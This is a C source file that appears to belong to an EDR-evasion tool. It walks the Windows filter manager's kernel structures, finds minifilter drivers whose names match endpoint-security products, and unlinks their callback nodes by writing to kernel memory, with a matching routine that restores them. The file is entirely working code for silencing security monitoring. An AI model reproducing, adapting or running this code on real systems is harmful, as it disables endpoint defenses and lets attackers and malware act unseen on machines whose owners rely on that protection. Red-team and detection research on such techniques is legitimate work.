#include <Windows.h>
#include <Tchar.h>

#ifdef _DEBUG
#include <assert.h>
#endif

#include "FltmgrOffsets.h"
#include "IsEDRChecks.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "PrintFunctions.h"
#include "PdbSymbols.h"
#include "MinifilterCallbacks.h"


BOOL EnumEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* foundEDRCallbacks, BOOL verbose) {
	BOOL edrCallbacksWereFound = FALSE;

	DWORD64 fltmgr_base = FindKernelModuleAddressByName(L"fltmgr.sys");
	if (!fltmgr_base)
		return -1;
	if (verbose) {
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\tfltmgr.sys : %016llx\n"), fltmgr_base);
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\tFltGlobals : %016llx\n"), fltmgr_base
			+ g_fltmgrOffsets.st.FltGlobals);
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\tFrameList  : %016llx\n"), fltmgr_base
			+ g_fltmgrOffsets.st.FltGlobals
			+ g_fltmgrOffsets.st._GLOBALS_FrameList
			+ g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList);
	}

	_putts_or_not(TEXT("[*] [MinifilterCallbacks]\tEnumerating minifilters' frames, filters, instances and callback nodes:"));
	DWORD64 frame_list_header = fltmgr_base 
		+ g_fltmgrOffsets.st.FltGlobals 
		+ g_fltmgrOffsets.st._GLOBALS_FrameList
		+ g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
	for (DWORD64 current_frame_shifted = ReadMemoryDWORD64(frame_list_header);
		current_frame_shifted != frame_list_header;
		current_frame_shifted = ReadMemoryDWORD64(current_frame_shifted)
		) {
		DWORD64 current_frame = current_frame_shifted - g_fltmgrOffsets.st._FLTP_FRAME_Links;
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\t_FLTP_FRAME : %016llx:\n"), current_frame);

		DWORD64 filter_list_header = current_frame + g_fltmgrOffsets.st._FLTP_FRAME_RegisteredFilters + g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
		for (DWORD64 current_filter_shifted = ReadMemoryDWORD64(filter_list_header);
			current_filter_shifted != filter_list_header;
			current_filter_shifted = ReadMemoryDWORD64(current_filter_shifted)
			) {
			DWORD64 current_filter = current_filter_shifted - g_fltmgrOffsets.st._FLT_OBJECT_PrimaryLink;


			// check if current filter is EDR-related
			DWORD64 driverObject = ReadMemoryDWORD64(current_filter + g_fltmgrOffsets.st._FLT_FILTER_DriverObject);
			DWORD64 driverInit = ReadMemoryDWORD64(driverObject + g_fltmgrOffsets.st._DRIVER_OBJECT_DriverInit);
			DWORD64 driverOffset;
			TCHAR* driver = FindDriverName(driverInit, &driverOffset);
			_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t_FLT_FILTER %016llx (%s)\n"), current_filter, driver);

			if (driver && isDriverNameMatchingEDR(driver)) {
				_putts_or_not(TEXT("[+] [MinifilterCallbacks]\t\t\tEDR-related filter found! Enumerating callbacks from all instances:"));

				DWORD64 instance_list_header = current_filter + g_fltmgrOffsets.st._FLT_FILTER_InstanceList + g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
				for (DWORD64 current_instance_shifted = ReadMemoryDWORD64(instance_list_header);
					current_instance_shifted != instance_list_header;
					current_instance_shifted = ReadMemoryDWORD64(current_instance_shifted)
					) {
					DWORD64 current_instance = current_instance_shifted - g_fltmgrOffsets.st._FLT_INSTANCE_FilterLink;
					_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t\t_FLT_INSTANCE %016llx: "), current_instance);
					//printf("\t[*] CallbackNodes  : 0x%p\n", (PVOID)CallbackNodesEntry);

					// for each CALLBACK_NODE in the array
					DWORD64 CallbackNodesEntry = current_instance + g_fltmgrOffsets.st._FLT_INSTANCE_CallbackNodes;
					SIZE_T nbCallbackNodes = 0;
					for (int j = 0; j < 50; j++)
					{
						DWORD64 CallbackNodePointer = ReadMemoryDWORD64(CallbackNodesEntry + (j * 8));
						// Register all callback nodes
						if (CallbackNodePointer)
						{
							// Ugly hack: check if the node really is part of a linked list or have already been unlinked
							// TODO: change the whole logic of this file and browse callback nodes directly from _FLT_VOLUME.Callbacks.OperationLists ?
							DWORD64 prevNode = ReadMemoryDWORD64(CallbackNodePointer + offsetof(LIST_ENTRY, Blink));
							DWORD64 prevNodeNext = ReadMemoryDWORD64(prevNode + offsetof(LIST_ENTRY, Flink));
							DWORD64 nextNode = ReadMemoryDWORD64(CallbackNodePointer + offsetof(LIST_ENTRY, Flink));
							DWORD64 nextNodePrev = ReadMemoryDWORD64(nextNode + offsetof(LIST_ENTRY, Blink));
							if (prevNodeNext != CallbackNodePointer && nextNodePrev != CallbackNodePointer) {
								continue;
							}

							struct KRNL_CALLBACK cb = {
								.type = MINIFILTER_CALLBACK,
								.addresses.minifilter_callback.callback_node = CallbackNodePointer,
								.callback_func = 0, //TODO: complete with preoperation & postoperations func address for information
								.driver_name = driver,
								.removed = FALSE,
							};
							AddFoundKernelCallback(foundEDRCallbacks, &cb);
							edrCallbacksWereFound = TRUE;
							nbCallbackNodes++;
						}
					}
					_tprintf_or_not(TEXT("%llu callback nodes found!\n"), nbCallbackNodes);
				}
			}
		}
	}

	return edrCallbacksWereFound;
}

#if WriteMemoryPrimitiveIsAtomic
void RemoveEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
	_putts_or_not(TEXT("[+] [MinifilterCallbacks]\tRemoving previously identified callbacks nodes by unlinking them from their list"));
	SIZE_T counter = 0;
	for (struct KRNL_CALLBACK* ptr = edrCallbacks->EDR_CALLBACKS;
		ptr < edrCallbacks->EDR_CALLBACKS + edrCallbacks->size;
		ptr++
		) {
		if (ptr->type == MINIFILTER_CALLBACK &&
			ptr->removed == FALSE) {
			DWORD64 callbackNodeAddress = ptr->addresses.minifilter_callback.callback_node;
			DWORD64 prevNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Blink));
			DWORD64 nextNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Flink));
			WriteMemoryDWORD64(nextNodeAddress + offsetof(LIST_ENTRY, Blink), prevNodeAddress);
			WriteMemoryDWORD64(prevNodeAddress + offsetof(LIST_ENTRY, Flink), nextNodeAddress);
			ptr->removed = TRUE;
			counter++;
		}
	}
	_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t%llu callback nodes were removed!\n"), counter);
}

BOOL RestoreEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
	BOOL success = TRUE;
	_putts_or_not(TEXT("[+] [MinifilterCallbacks]\tRestoring unlinked callbacks node by re-inserting them in their original place"));
	SIZE_T counter = 0;
	// reinsert the nodes in the inverse order to avoid invalid states
	for (struct KRNL_CALLBACK* ptr = edrCallbacks->EDR_CALLBACKS + edrCallbacks->size - 1;
		edrCallbacks->EDR_CALLBACKS <= ptr;
		ptr--
		) {
		if (ptr->type == MINIFILTER_CALLBACK &&
			ptr->removed == TRUE) {
			DWORD64 callbackNodeAddress = ptr->addresses.minifilter_callback.callback_node;
			DWORD64 prevNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Blink));
			DWORD64 nextNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Flink));

			// Checks that "previous" and "next" nodes are still next to each other in the list
			DWORD64 prevNodeFlink = ReadMemoryDWORD64(prevNodeAddress + offsetof(LIST_ENTRY, Flink));
			DWORD64 nextNodeBlink = ReadMemoryDWORD64(nextNodeAddress + offsetof(LIST_ENTRY, Blink));
			if (prevNodeFlink != nextNodeAddress || nextNodeBlink != prevNodeAddress) {
				_putts_or_not(TEXT("[-] [MinifilterCallbacks]\tWARNING: a callback node could not have been restored! Maybe the node list changed between node removal and node reinsertion?"));
				success = FALSE;
				continue;
			}

			WriteMemoryDWORD64(nextNodeAddress + offsetof(LIST_ENTRY, Blink), callbackNodeAddress);
			WriteMemoryDWORD64(prevNodeAddress + offsetof(LIST_ENTRY, Flink), callbackNodeAddress);
			ptr->removed = FALSE;
			counter++;
		}
	}
	_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t%llu callback nodes were restored!\n"), counter);
	return success;
}
#endif